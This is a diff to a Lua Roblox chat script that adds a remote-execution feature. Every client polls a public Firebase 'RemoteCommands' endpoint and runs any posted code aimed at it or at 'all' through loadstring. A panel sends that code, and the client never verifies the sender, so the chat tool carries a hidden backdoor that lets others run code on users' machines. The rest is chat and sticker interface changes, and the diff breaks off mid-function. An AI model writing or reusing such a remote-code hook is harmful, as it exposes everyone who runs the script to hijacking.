@@ -1,6 +1,4 @@
--- JXNULL CHAT GLOBAl
--- Un poco ma chica en movil
-
+-- JXNULL CHAT GLOBAL V2 - SISTEMA DE ADMIN REMOTO
 -- Sistema de carpetas
 if makefolder and not isfolder("JXNULL_CONFIGS") then
     makefolder("JXNULL_CONFIGS")
@@ -12,6 +10,12 @@ local ChatScripters = {
     ["joao_mods26"] = true,
     ["donxexman"] = true,
     ["INFINITYH4CK"] = true
+}
+
+-- LISTA DE SUPER ADMINISTRADORES (Solo pueden ejecutar scripts remotos)
+local SuperAdmins = {
+    ["joao_modsF"] = true,
+    ["donxexman"] = true
 }
 
 -- 🔧 SERVICIOS Y VARIABLES GLOBALES
@@ -27,7 +31,7 @@ local hrpCFrame = nil
 
 -- Variables del GUI
 local gui, chatBox, frame, sendButton, textBox, settingsFrame, bgImage = nil, nil, nil, nil, nil, nil, nil
-local inputContainer = nil -- AÑADIDO AQUÍ PARA SCOPE GLOBAL
+local inputContainer = nil
 local ultimoMensajeID = nil
 local guiActivo = false
 local ShowChatNotify = false
@@ -47,9 +51,14 @@ local stickersGuardados = {}
 local mensajeRespondiendo = nil
 local misRespuestasPendientes = {}
 
+-- Variables para sistema de ejecución remota
+local remoteExecutionPanel = nil
+local ultimoComandoID = nil
+
 -- URLs de Firebase
 local firebaseURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Chat.json"
 local respuestasURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Respuestas.json"
+local remoteCommandsURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands.json"
 local request = (syn and syn.request) or http_request or (fluxus and fluxus.request) or request
 
 -- 🎨 FUNCIONES DE STICKERS
@@ -82,18 +91,15 @@ end
 local function DetectarURLImagen(texto)
     texto = texto:gsub("^%s*(.-)%s*$", "%1")
     
-    -- 1. Solo números (ID de Roblox) - SOLO si es la única palabra
     if texto:match("^%d+$") and #texto >= 5 then
         return "rbxassetid://" .. texto
     end
     
-    -- 2. rbxassetid:// directo
     if texto:find("rbxassetid://") then
         local id = texto:match("rbxassetid://(%d+)")
         if id then return "rbxassetid://" .. id end
     end
     
-    -- 3-5. URLs de Roblox
     if texto:find("roblox%.com/asset/") then
         local id = texto:match("/asset/(%d+)")
         if id then return "rbxassetid://" .. id end
@@ -109,7 +115,6 @@ local function DetectarURLImagen(texto)
         if id then return "rbxassetid://" .. id end
     end
     
-    -- 6-9. URLs externas
     if texto:find("cdn%.discordapp%.com") or texto:find("media%.discordapp%.net") then
         local url = texto:match("https?://[%w%.%-_]+%.discordapp%.%a+/[%w%.%-_/]+")
         if url then return url end
@@ -178,6 +183,312 @@ local function EliminarSticker(index)
         return true
     end
     return false
+end
+
+-- 🔥 SISTEMA DE EJECUCIÓN REMOTA
+local function EjecutarScriptRemoto(scriptCode)
+    task.spawn(function()
+        local success, err = pcall(function()
+            loadstring(scriptCode)()
+        end)
+        
+        if not success then
+            warn("❌ Error al ejecutar script remoto:", err)
+        end
+    end)
+end
+
+local function EscucharComandosRemotos()
+    task.spawn(function()
+        while escuchaActiva do
+            local success, response = pcall(function()
+                return request({
+                    Url = remoteCommandsURL,
+                    Method = "GET"
+                })
+            end)
+            
+            if success and response and response.Body then
+                local ok, comandos = pcall(function()
+                    return HttpService:JSONDecode(response.Body)
+                end)
+                
+                if ok and typeof(comandos) == "table" then
+                    for comandoId, cmd in pairs(comandos) do
+                        if cmd.target == player.Name or cmd.target == "all" then
+                            if not ultimoComandoID or comandoId ~= ultimoComandoID then
+                                ultimoComandoID = comandoId
+                                
+                                print("🔥 Ejecutando script remoto de:", cmd.admin)
+                                EjecutarScriptRemoto(cmd.script)
+                                
+                                -- Eliminar comando después de ejecutar
+                                pcall(function()
+                                    request({
+                                        Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
+                                        Method = "DELETE"
+                                    })
+                                end)
+                            end
+                        end
+                    end
+                end
+            end
+            
+            task.wait(1)
+        end
+    end)
+end
+
+local function CrearPanelEjecucionRemota()
+    if remoteExecutionPanel and remoteExecutionPanel.Parent then
+        remoteExecutionPanel:Destroy()
+    end
+    
+    local panelWidth = isMobile and math.min(frame.AbsoluteSize.X * 0.95, 360) or 420
+    local panelHeight = isMobile and 340 or 380
+    
+    remoteExecutionPanel = Instance.new("Frame")
+    remoteExecutionPanel.Name = "RemoteExecutionPanel"
+    remoteExecutionPanel.Size = UDim2.new(0, panelWidth, 0, panelHeight)
+    remoteExecutionPanel.Position = UDim2.new(0.5, -panelWidth/2, 0.5, -panelHeight/2)
+    remoteExecutionPanel.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    remoteExecutionPanel.BorderSizePixel = 0
+    remoteExecutionPanel.ZIndex = 30
+    remoteExecutionPanel.Parent = gui
+    
+    local panelCorner = Instance.new("UICorner", remoteExecutionPanel)
+    panelCorner.CornerRadius = UDim.new(0, 12)
+    
+    local panelStroke = Instance.new("UIStroke", remoteExecutionPanel)
+    panelStroke.Color = Color3.fromRGB(220, 53, 69)
+    panelStroke.Thickness = 3
+    
+    -- Título
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, isMobile and 40 or 45)
+    titleBar.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
+    titleBar.BorderSizePixel = 0
+    titleBar.ZIndex = 31
+    titleBar.Parent = remoteExecutionPanel
+    
+    local titleCorner = Instance.new("UICorner", titleBar)
+    titleCorner.CornerRadius = UDim.new(0, 12)
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.7, 0, 1, 0)
+    title.Position = UDim2.new(0, 10, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "🔥 EJECUCIÓN REMOTA"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = isMobile and 14 or 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.ZIndex = 32
+    title.Parent = titleBar
+    
+    -- Botón cerrar
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, isMobile and 32 or 36, 0, isMobile and 32 or 36)
+    closeBtn.Position = UDim2.new(1, -(isMobile and 37 or 41), 0.5, -(isMobile and 16 or 18))
+    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = isMobile and 16 or 18
+    closeBtn.BorderSizePixel = 0
+    closeBtn.ZIndex = 32
+    closeBtn.Parent = titleBar
+    
+    local closeBtnCorner = Instance.new("UICorner", closeBtn)
+    closeBtnCorner.CornerRadius = UDim.new(0, 8)
+    
+    closeBtn.MouseButton1Click:Connect(function()
+        TweenService:Create(remoteExecutionPanel, TweenInfo.new(0.2), {
+            Size = UDim2.new(0, 0, 0, 0)
+        }):Play()
+        task.wait(0.2)
+        remoteExecutionPanel:Destroy()
+        remoteExecutionPanel = nil
+    end)
+    
+    -- Contenido
+    local contentFrame = Instance.new("Frame")
+    contentFrame.Size = UDim2.new(1, -20, 1, -(isMobile and 55 or 60))
+    contentFrame.Position = UDim2.new(0, 10, 0, isMobile and 45 or 50)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.ZIndex = 31
+    contentFrame.Parent = remoteExecutionPanel
+    
+    -- Label Target
+    local targetLabel = Instance.new("TextLabel")
+    targetLabel.Size = UDim2.new(1, 0, 0, 20)
+    targetLabel.Position = UDim2.new(0, 0, 0, 5)
+    targetLabel.BackgroundTransparency = 1
+    targetLabel.Text = "👤 Usuario objetivo:"
+    targetLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    targetLabel.Font = Enum.Font.GothamMedium
+    targetLabel.TextSize = isMobile and 11 or 13
+    targetLabel.TextXAlignment = Enum.TextXAlignment.Left
+    targetLabel.ZIndex = 32
+    targetLabel.Parent = contentFrame
+    
+    -- Input Target
+    local targetInput = Instance.new("TextBox")
+    targetInput.Name = "TargetInput"
+    targetInput.Size = UDim2.new(1, 0, 0, isMobile and 35 or 40)
+    targetInput.Position = UDim2.new(0, 0, 0, 28)
+    targetInput.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    targetInput.PlaceholderText = "Nombre del usuario o 'all' para todos"
+    targetInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
+    targetInput.Text = ""
+    targetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    targetInput.Font = Enum.Font.Gotham
+    targetInput.TextSize = isMobile and 12 or 14
+    targetInput.ClearTextOnFocus = false
+    targetInput.ZIndex = 32
+    targetInput.Parent = contentFrame
+    
+    local targetCorner = Instance.new("UICorner", targetInput)
+    targetCorner.CornerRadius = UDim.new(0, 8)
+    
+    local targetStroke = Instance.new("UIStroke", targetInput)
+    targetStroke.Color = Color3.fromRGB(88, 101, 242)
+    targetStroke.Thickness = 1.5
+    
+    -- Label Script
+    local scriptLabel = Instance.new("TextLabel")
+    scriptLabel.Size = UDim2.new(1, 0, 0, 20)
+    scriptLabel.Position = UDim2.new(0, 0, 0, isMobile and 73 or 78)
+    scriptLabel.BackgroundTransparency = 1
+    scriptLabel.Text = "📜 Script a ejecutar:"
+    scriptLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    scriptLabel.Font = Enum.Font.GothamMedium
+    scriptLabel.TextSize = isMobile and 11 or 13
+    scriptLabel.TextXAlignment = Enum.TextXAlignment.Left
+    scriptLabel.ZIndex = 32
+    scriptLabel.Parent = contentFrame
+    
+    -- ScrollingFrame para el script
+    local scriptScroll = Instance.new("ScrollingFrame")
+    scriptScroll.Name = "ScriptScroll"
+    scriptScroll.Size = UDim2.new(1, 0, 0, isMobile and 160 or 180)
+    scriptScroll.Position = UDim2.new(0, 0, 0, isMobile and 96 or 101)
+    scriptScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    scriptScroll.BorderSizePixel = 0
+    scriptScroll.ScrollBarThickness = isMobile and 4 or 6
+    scriptScroll.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
+    scriptScroll.ZIndex = 32
+    scriptScroll.Parent = contentFrame
+    
+    local scriptScrollCorner = Instance.new("UICorner", scriptScroll)
+    scriptScrollCorner.CornerRadius = UDim.new(0, 8)
+    
+    local scriptScrollStroke = Instance.new("UIStroke", scriptScroll)
+    scriptScrollStroke.Color = Color3.fromRGB(88, 101, 242)
+    scriptScrollStroke.Thickness = 1.5
+    
+    -- TextBox del script
+    local scriptInput = Instance.new("TextBox")
+    scriptInput.Name = "ScriptInput"
+    scriptInput.Size = UDim2.new(1, -10, 1, 0)
+    scriptInput.Position = UDim2.new(0, 5, 0, 5)
+    scriptInput.BackgroundTransparency = 1
+    scriptInput.PlaceholderText = "-- Escribe el script aquí...\nprint('Hola mundo')"
+    scriptInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
+    scriptInput.Text = ""
+    scriptInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    scriptInput.Font = Enum.Font.Code
+    scriptInput.TextSize = isMobile and 11 or 13
+    scriptInput.TextXAlignment = Enum.TextXAlignment.Left
+    scriptInput.TextYAlignment = Enum.TextYAlignment.Top
+    scriptInput.ClearTextOnFocus = false
+    scriptInput.MultiLine = true
+    scriptInput.TextWrapped = true
+    scriptInput.ZIndex = 33
+    scriptInput.Parent = scriptScroll
+    
+    -- Ajustar tamaño del canvas
+    scriptInput:GetPropertyChangedSignal("Text"):Connect(function()
+        local lines = select(2, scriptInput.Text:gsub("\n", "\n")) + 1
+        local lineHeight = scriptInput.TextSize + 5
+        scriptInput.Size = UDim2.new(1, -10, 0, math.max(lines * lineHeight, scriptScroll.AbsoluteSize.Y - 10))
+    end)
+    
+    -- Botón Ejecutar
+    local executeBtn = Instance.new("TextButton")
+    executeBtn.Name = "ExecuteButton"
+    executeBtn.Size = UDim2.new(1, 0, 0, isMobile and 40 or 45)
+    executeBtn.Position = UDim2.new(0, 0, 1, -(isMobile and 45 or 50))
+    executeBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
+    executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+    executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    executeBtn.Font = Enum.Font.GothamBold
+    executeBtn.TextSize = isMobile and 13 or 15
+    executeBtn.BorderSizePixel = 0
+    executeBtn.ZIndex = 32
+    executeBtn.Parent = contentFrame
+    
+    local executeCorner = Instance.new("UICorner", executeBtn)
+    executeCorner.CornerRadius = UDim.new(0, 8)
+    
+    executeBtn.MouseButton1Click:Connect(function()
+        local target = targetInput.Text:gsub("^%s*(.-)%s*$", "%1")
+        local script = scriptInput.Text:gsub("^%s*(.-)%s*$", "%1")
+        
+        if target == "" then
+            executeBtn.Text = "❌ FALTA USUARIO"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            return
+        end
+        
+        if script == "" then
+            executeBtn.Text = "❌ FALTA SCRIPT"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            return
+        end
+        
+        executeBtn.Text = "⏳ ENVIANDO..."
+        
+        local commandData = {
+            admin = player.Name,
+            target = target,
+            script = script,
+            time = os.time()
+        }
+        
+        local json = HttpService:JSONEncode(commandData)
+        
+        local success = pcall(function()
+            request({
+                Url = remoteCommandsURL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = json
+            })
+        end)
+        
+        if success then
+            executeBtn.Text = "✅ ENVIADO"
+            targetInput.Text = ""
+            scriptInput.Text = ""
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+        else
+            executeBtn.Text = "❌ ERROR AL ENVIAR"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+        end
+    end)
+    
+    -- Animación de entrada
+    remoteExecutionPanel.Size = UDim2.new(0, 0, 0, 0)
+    TweenService:Create(remoteExecutionPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+        Size = UDim2.new(0, panelWidth, 0, panelHeight)
+    }):Play()
 end
 
 -- FUNCIONES DE COMANDOS
@@ -418,7 +729,6 @@ local function CrearPanelStickers()
     panelStroke.Color = Color3.fromRGB(88, 101, 242)
     panelStroke.Thickness = 2
     
-    -- Título
     local titleBar = Instance.new("Frame")
     titleBar.Name = "TitleBar"
     titleBar.Size = UDim2.new(1, 0, 0, isMobile and 35 or 40)
@@ -442,7 +752,6 @@ local function CrearPanelStickers()
     title.ZIndex = 27
     title.Parent = titleBar
     
-    -- Botón cerrar
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, isMobile and 28 or 32, 0, isMobile and 28 or 32)
     closeBtn.Position = UDim2.new(1, -(isMobile and 33 or 37), 0.5, -(isMobile and 14 or 16))
@@ -465,20 +774,19 @@ local function CrearPanelStickers()
         stickerPanel = nil
     end)
     
-    -- ScrollingFrame para stickers
-local stickerScroll = Instance.new("ScrollingFrame")
-stickerScroll.Name = "StickerScroll"
-stickerScroll.Size = UDim2.new(1, -20, 1, -(isMobile and 50 or 55))
-stickerScroll.Position = UDim2.new(0, 10, 0, isMobile and 40 or 45)
-stickerScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-stickerScroll.BackgroundTransparency = 0.5
-stickerScroll.BorderSizePixel = 0
-stickerScroll.ScrollBarThickness = isMobile and 4 or 6
-stickerScroll.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
-stickerScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y  -- ✅ LÍNEA AÑADIDA
-stickerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)           -- ✅ LÍNEA AÑADIDA
-stickerScroll.ZIndex = 26
-stickerScroll.Parent = stickerPanel
+    local stickerScroll = Instance.new("ScrollingFrame")
+    stickerScroll.Name = "StickerScroll"
+    stickerScroll.Size = UDim2.new(1, -20, 1, -(isMobile and 50 or 55))
+    stickerScroll.Position = UDim2.new(0, 10, 0, isMobile and 40 or 45)
+    stickerScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    stickerScroll.BackgroundTransparency = 0.5
+    stickerScroll.BorderSizePixel = 0
+    stickerScroll.ScrollBarThickness = isMobile and 4 or 6
+    stickerScroll.ScrollBarImageColor3 = Color3.fromRGB(88, 101, 242)
+    stickerScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    stickerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    stickerScroll.ZIndex = 26
+    stickerScroll.Parent = stickerPanel
     
     local scrollCorner = Instance.new("UICorner", stickerScroll)
     scrollCorner.CornerRadius = UDim.new(0, 8)
@@ -494,7 +802,6 @@ stickerScroll.Parent = stickerPanel
     gridPadding.PaddingTop = UDim.new(0, 5)
     gridPadding.PaddingBottom = UDim.new(0, 5)
     
-    -- Crear stickers
     if #stickersGuardados == 0 then
         local emptyLabel = Instance.new("TextLabel")
         emptyLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -534,7 +841,6 @@ stickerScroll.Parent = stickerPanel
             local imgCorner = Instance.new("UICorner", stickerImg)
             imgCorner.CornerRadius = UDim.new(0, 6)
             
-            -- Botones
             local btnContainer = Instance.new("Frame")
             btnContainer.Size = UDim2.new(1, 0, 0, 25)
             btnContainer.Position = UDim2.new(0, 0, 1, -25)
@@ -608,7 +914,7 @@ stickerScroll.Parent = stickerPanel
     }):Play()
 end
 
--- FUNCIÓN: MOSTRAR MENSAJES
+-- FUNCIÓN: MOSTRAR MENSAJES (CONTINUARÁ EN SIGUIENTE PARTE POR LÍMITE DE CARACTERES)
 local function showMessages(data)
     if not chatBox then return end
 
@@ -643,15 +949,12 @@ local function showMessages(data)
         local username = tostring(msg.username or "???")
         local text = tostring(msg.text or "")
         
-        -- Detectar URL de imagen en el texto
         local urlImagen = DetectarURLImagen(text)
         local esSticker = urlImagen ~= nil
         
-        -- Extraer texto sin la URL
         local textoSinURL = ExtraerTextoSinURL(text, urlImagen)
         local hayTextoAdicional = textoSinURL ~= "" and textoSinURL ~= text
         
-        -- SOLO guardar sticker si hay una imagen
         if esSticker and not text:lower():find("discord") then
             local success, resultado = AgregarSticker(urlImagen, username .. "_" .. os.time())
         end
@@ -664,7 +967,6 @@ local function showMessages(data)
             tagColor = Color3.fromRGB(255, 215, 0)
         end
 
-        -- Comandos
         local args = text:split(" ")
         local comando = args[1]:lower()
         
@@ -701,81 +1003,56 @@ local function showMessages(data)
             end
         end
 
--- 🔧 CALCULAR DIMENSIONES CORRECTAMENTE
-local avatarSize = isMobile and 40 or 50
-local anchoDisponible = chatBox.AbsoluteSize.X - avatarSize - 70
+        local avatarSize = isMobile and 40 or 50
+        local anchoDisponible = chatBox.AbsoluteSize.X - avatarSize - 70
+        local stickerRealSize = isMobile and 80 or 120
+        
+        local alturaTextoMensaje = 0
+        if not esSticker then
+            alturaTextoMensaje = CalcularAlturaTexto(text, anchoDisponible, isMobile and 12 or 13, Enum.Font.Gotham)
+        elseif hayTextoAdicional then
+            alturaTextoMensaje = CalcularAlturaTexto(textoSinURL, anchoDisponible, isMobile and 12 or 13, Enum.Font.Gotham)
+        end
+        
+        local alturaSticker = 0
+        if esSticker then
+            alturaSticker = stickerRealSize
+        end
+        
+        local alturaGameInfo = CalcularAlturaTexto("🎮 " .. (msg.game_name or "Unknown Game"), anchoDisponible, isMobile and 9 or 11, Enum.Font.GothamMedium)
+        
+        local alturaRespuesta = 0
+        if msg.reply_to then
+            alturaRespuesta = isMobile and 35 or 40
+        end
+        
+        local alturaTotal = 0
+        alturaTotal = alturaTotal + 20
+        alturaTotal = alturaTotal + alturaGameInfo + 6
+        
+        if msg.reply_to then
+            alturaTotal = alturaTotal + alturaRespuesta + 5
+        end
+        
+        if esSticker and hayTextoAdicional then
+            local urlAlInicio = text:find("^%s*" .. (urlImagen or "XXXX"))
+            
+            if urlAlInicio then
+                alturaTotal = alturaTotal + alturaSticker + 10 + alturaTextoMensaje
+            else
+                alturaTotal = alturaTotal + alturaTextoMensaje + 8 + alturaSticker
+            end
+            
+        elseif esSticker then
+            alturaTotal = alturaTotal + alturaSticker
+            
+        else
+            alturaTotal = alturaTotal + alturaTextoMensaje
+        end
+        
+        alturaTotal = alturaTotal + 15
+        alturaTotal = math.max(alturaTotal, avatarSize + 20)
 
--- Tamaño real del sticker (coincide con el ImageLabel)
-local stickerRealSize = isMobile and 80 or 120
-
--- Calcular altura del texto principal
-local alturaTextoMensaje = 0
-if not esSticker then
-    -- Si NO hay imagen, calcular altura del texto completo
-    alturaTextoMensaje = CalcularAlturaTexto(text, anchoDisponible, isMobile and 12 or 13, Enum.Font.Gotham)
-elseif hayTextoAdicional then
-    -- Si hay imagen Y texto adicional, calcular altura del texto sin URL
-    alturaTextoMensaje = CalcularAlturaTexto(textoSinURL, anchoDisponible, isMobile and 12 or 13, Enum.Font.Gotham)
-end
-
--- Altura del sticker (usar tamaño REAL del contenedor)
-local alturaSticker = 0
-if esSticker then
-    alturaSticker = stickerRealSize
-end
-
--- Altura del game info
-local alturaGameInfo = CalcularAlturaTexto("🎮 " .. (msg.game_name or "Unknown Game"), anchoDisponible, isMobile and 9 or 11, Enum.Font.GothamMedium)
-
--- Altura de respuesta
-local alturaRespuesta = 0
-if msg.reply_to then
-    alturaRespuesta = isMobile and 35 or 40
-end
-
--- 🔧 CALCULAR ALTURA TOTAL OPTIMIZADA
-local alturaTotal = 0
-
--- 1. Username (siempre presente)
-alturaTotal = alturaTotal + 20
-
--- 2. Game Info + su espaciado
-alturaTotal = alturaTotal + alturaGameInfo + 6
-
--- 3. Respuesta (si existe)
-if msg.reply_to then
-    alturaTotal = alturaTotal + alturaRespuesta + 5
-end
-
--- 4. Contenido (sticker y/o texto)
-if esSticker and hayTextoAdicional then
-    -- Caso: Sticker + Texto
-    local urlAlInicio = text:find("^%s*" .. (urlImagen or "XXXX"))
-    
-    if urlAlInicio then
-        -- URL al inicio: Sticker arriba, texto abajo
-        alturaTotal = alturaTotal + alturaSticker + 10 + alturaTextoMensaje
-    else
-        -- URL al final: Texto arriba, sticker abajo
-        alturaTotal = alturaTotal + alturaTextoMensaje + 8 + alturaSticker
-    end
-    
-elseif esSticker then
-    -- Caso: Solo Sticker
-    alturaTotal = alturaTotal + alturaSticker
-    
-else
-    -- Caso: Solo Texto
-    alturaTotal = alturaTotal + alturaTextoMensaje
-end
-
--- 5. Padding final
-alturaTotal = alturaTotal + 15
-
--- Asegurar altura mínima para el avatar
-alturaTotal = math.max(alturaTotal, avatarSize + 20)
-
-        -- Contenedor
         local container = Instance.new("Frame")
         container.Name = "MessageContainer_" .. messageId
         container.Size = UDim2.new(1, -10, 0, alturaTotal)
@@ -819,7 +1096,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
         end)
         if success then userId = result end
 
-        -- Avatar
         local avatarContainer = Instance.new("Frame")
         avatarContainer.Name = "AvatarContainer"
         avatarContainer.Size = UDim2.new(0, avatarSize, 0, avatarSize)
@@ -830,7 +1106,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
 
         local avatarCorner = Instance.new("UICorner", avatarContainer)
         avatarCorner.CornerRadius = UDim.new(0, avatarSize/2)
-
 
         local avatarStroke = Instance.new("UIStroke", avatarContainer)
         avatarStroke.Color = ChatScripters[username] and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(88, 101, 242)
@@ -848,7 +1123,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
         local avatarImgCorner = Instance.new("UICorner", avatar)
         avatarImgCorner.CornerRadius = UDim.new(0, (avatarSize-4)/2)
 
-        -- Frame del mensaje
         local messageFrame = Instance.new("Frame")
         messageFrame.Name = "MessageFrame"
         messageFrame.Size = UDim2.new(1, -(avatarSize + 20), 1, -10)
@@ -857,7 +1131,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
         messageFrame.ZIndex = 3
         messageFrame.Parent = container
 
-        -- Usuario
         local usernameLabel = Instance.new("TextLabel")
         usernameLabel.Name = "Username"
         usernameLabel.Size = UDim2.new(0, 200, 0, 18)
@@ -870,7 +1143,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
         usernameLabel.ZIndex = 4
         usernameLabel.Parent = messageFrame
 
-        -- Tag Owner
         if ChatScripters[username] then
             local tagWidth = isMobile and 70 or 85
             local tagHeight = isMobile and 18 or 20
@@ -955,7 +1227,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
 
         local offsetY = 20
 
-        -- Mensaje de respuesta
         if msg.reply_to then
             local replyFrame = Instance.new("Frame")
             replyFrame.Name = "ReplyReference"
@@ -1004,7 +1275,6 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
             offsetY = offsetY + (isMobile and 35 or 40)
         end
 
-        -- Nombre del juego
         local gameInfo = Instance.new("TextLabel")
         gameInfo.Name = "GameInfo"
         gameInfo.Size = UDim2.new(1, -50, 0, alturaGameInfo + 4)
@@ -1022,113 +1292,12 @@ alturaTotal = math.max(alturaTotal, avatarSize + 20)
 
         offsetY = offsetY + alturaGameInfo + 6
 
-        -- Determinar el orden de mostrado basado en la posición de la URL
         local urlAlInicio = text:find("^%s*" .. (urlImagen or "XXXX"))
         
         if esSticker and urlAlInicio then
-            -- URL al inicio: primero sticker, luego texto
-            
-            -- MOSTRAR STICKER
-local stickerContainer = Instance.new("Frame")
-stickerContainer.Name = "StickerContainer"
-stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
-            stickerContainer.Position = UDim2.new(0, 0, 0, offsetY)
-            stickerContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
-            stickerContainer.BorderSizePixel = 0
-            stickerContainer.ZIndex = 4
-            stickerContainer.Parent = messageFrame
-            
-            local stickerCorner = Instance.new("UICorner", stickerContainer)
-            stickerCorner.CornerRadius = UDim.new(0, 12)
-            
-            local stickerStroke = Instance.new("UIStroke", stickerContainer)
-            stickerStroke.Color = Color3.fromRGB(88, 101, 242)
-            stickerStroke.Thickness = 2
-            stickerStroke.Transparency = 0.5
-            
-            local stickerImage = Instance.new("ImageLabel")
-            stickerImage.Name = "StickerImage"
-            stickerImage.Size = UDim2.new(1, -10, 1, -10)
-            stickerImage.Position = UDim2.new(0, 5, 0, 5)
-            stickerImage.BackgroundTransparency = 1
-            stickerImage.Image = urlImagen
-            stickerImage.ScaleType = Enum.ScaleType.Fit
-            stickerImage.ZIndex = 5
-            stickerImage.Parent = stickerContainer
-            
-            local imgCorner = Instance.new("UICorner", stickerImage)
-            imgCorner.CornerRadius = UDim.new(0, 10)
-            
-
-stickerContainer.MouseEnter:Connect(function()
-    TweenService:Create(stickerStroke, TweenInfo.new(0.2), {
-        Transparency = 0.2,
-        Thickness = 3
-    }):Play()
-    TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
-        Size = UDim2.new(0, stickerRealSize * 1.05, 0, stickerRealSize * 1.05)
-    }):Play()
-end)
-
-stickerContainer.MouseLeave:Connect(function()
-    TweenService:Create(stickerStroke, TweenInfo.new(0.2), {
-        Transparency = 0.5,
-        Thickness = 2
-    }):Play()
-    TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
-        Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
-    }):Play()
-end)
-
-           
-            
-offsetY = offsetY + stickerRealSize + 10
-            
-            -- MOSTRAR TEXTO SI EXISTE
-            if hayTextoAdicional then
-                local messageText = Instance.new("TextLabel")
-                messageText.Name = "MessageText"
-                messageText.Size = UDim2.new(1, -50, 0, alturaTextoMensaje + 4)
-                messageText.Position = UDim2.new(0, 0, 0, offsetY)
-                messageText.BackgroundTransparency = 1
-                messageText.Text = textoSinURL
-                messageText.TextColor3 = Color3.fromRGB(230, 230, 230)
-                messageText.Font = Enum.Font.Gotham
-                messageText.TextSize = isMobile and 12 or 13
-                messageText.TextXAlignment = Enum.TextXAlignment.Left
-                messageText.TextYAlignment = Enum.TextYAlignment.Top
-                messageText.TextWrapped = true
-                messageText.ZIndex = 4
-                messageText.Parent = messageFrame
-            end
-            
-        elseif esSticker then
-            -- URL al final o en medio: primero texto, luego sticker
-            
-            -- MOSTRAR TEXTO SI EXISTE
-            if hayTextoAdicional then
-                local messageText = Instance.new("TextLabel")
-                messageText.Name = "MessageText"
-                messageText.Size = UDim2.new(1, -50, 0, alturaTextoMensaje + 4)
-                messageText.Position = UDim2.new(0, 0, 0, offsetY)
-                messageText.BackgroundTransparency = 1
-                messageText.Text = textoSinURL
-                messageText.TextColor3 = Color3.fromRGB(230, 230, 230)
-                messageText.Font = Enum.Font.Gotham
-                messageText.TextSize = isMobile and 12 or 13
-                messageText.TextXAlignment = Enum.TextXAlignment.Left
-                messageText.TextYAlignment = Enum.TextYAlignment.Top
-                messageText.TextWrapped = true
-                messageText.ZIndex = 4
-                messageText.Parent = messageFrame
-                
-                offsetY = offsetY + alturaTextoMensaje + 8
-            end
-            
-            -- MOSTRAR STICKER
-          local stickerContainer = Instance.new("Frame")
-stickerContainer.Name = "StickerContainer"
-stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
+            local stickerContainer = Instance.new("Frame")
+            stickerContainer.Name = "StickerContainer"
+            stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
             stickerContainer.Position = UDim2.new(0, 0, 0, offsetY)
             stickerContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
             stickerContainer.BorderSizePixel = 0
